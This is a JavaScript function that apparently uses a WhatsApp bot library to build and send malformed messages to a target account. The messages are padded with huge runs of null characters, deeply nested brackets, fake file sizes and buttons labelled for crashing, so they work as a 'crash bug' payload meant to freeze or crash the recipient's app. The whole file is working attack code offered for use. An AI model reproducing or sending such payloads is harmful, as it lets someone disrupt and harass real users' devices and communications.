async function Poseidon(sock, target) {
  const buttoncrash = {
    quotedMessage: {
      buttonsMessage: {
        documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
          fileLength: "9999999999999",
          pageCount: 3567587327,
          mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
          fileName: "I Need Tante Fresh",
          fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
          directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1735456100",
          caption: "\n"
        },
        contentText: "?????",
        footerText: "\u0000".repeat(850000),
        buttons: [
          {
            buttonId: "Jamaludin",
            buttonText: { displayText: "?" },
            type: 1
          }
        ],
        headerType: 3
      }
    }
  };

  const firstPayload = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: '\u0000'.repeat(0),
          listType: 1,
          singleSelectReply: { selectedRowId: "id" },
          description: "Pp bg",
          contextInfo: {
            businessOwnerJid: "5511954801380@s.whatsapp.net",
            participant: "13135550002@s.whatsapp.net",
            mentionedJid: ["Poseidon - Invictus"],
            quotedMessage: buttoncrash.quotedMessage
          }
        }
      }
    }
  };

  const Navise = JSON.stringify({
    status: true,
    active: true,
    criador: "Sukiman",
    messageParamsJson: "{".repeat(10000),
    call_permission_request: {
      status: true,
      enabled: true,
      version: 3
    },
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: " ꙳͙͡༑ᐧزهروز ريي   𐌀𐌶𐌂𐌀𐌍𐌊 ✦ 𐌉𐌍𐍆𐌉𐌂𐍄𐌖𐍃𐍂 🦠 ",
            hasMediaAttachment: false
          },
          body: {
            text: " ꙳͙͡༑ᐧزهروز ريي   𐌀𐌶𐌂𐌀𐌍𐌊 ✦ 𐌉𐌍𐍆𐌉𐌂𐍄𐌖𐍃𐍂 🦠 ",
            format: "DEFAULT"
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(5000),
            buttons: [
              {
                name: "nested_call_permission",
                buttonParamsJson: JSON.stringify({
                  status: true,
                  power: "max",
                  ping: 9999,
                  cameraAccess: true
                })
              }
            ]
          }
        }
      }
    },
    buttons: [
      {
        name: "nested_crash",
        buttonParamsJson: JSON.stringify({
          messageParamsJson: "{".repeat(15000),
          crash: true,
          overdrive: true
        })
      },
      {
        name: "multi_repeat",
        buttonParamsJson: JSON.stringify({
          status: true,
          payload: Array.from({ length: 100 }, () => "{".repeat(50)),
          cameraAccess: true
        })
      }
    ],
    flood: Array.from({ length: 1000 }, () => ({
      nulls: "\u0000".repeat(100),
      emojis: "🦠".repeat(20),
      status: true
    }))
  });

  const secondMsg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: " ꙳͙͡༑ᐧزهروز ريي   𐌀𐌶𐌂𐌀𐌍𐌊 ✦ 𐌉𐌍𐍆𐌉𐌂𐍄𐌖𐍃𐍂 🦠 ",
            hasMediaAttachment: false
          },
          body: {
            text: " ꙳͙͡༑ᐧزهروز ريي   𐌀𐌶𐌂𐌀𐌍𐌊 ✦ 𐌉𐌍𐍆𐌉𐌂𐍄𐌖𐍃𐍂 🦠 " + "\u0000".repeat(30000),
            format: "DEFAULT"
          },
          nativeFlowMessage: {
            messageParamsJson: "{[".repeat(15000),
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: Navise
              },
              ...Array.from({ length: 4 }, () => ({
                name: "call_permission_request",
                buttonParamsJson: JSON.stringify({
                  status: true,
                  enabled: true,
                  overload: true,
                  cameraAccess: true
                })
              }))
            ]
          }
        }
      }
    }
  }, {});

  await sock.relayMessage(target, secondMsg.message, {
    messageId: secondMsg.key.id,
    participant: { jid: target }
  });

  await sock.relayMessage(target, firstPayload, {
    participant: { jid: target }
  });
}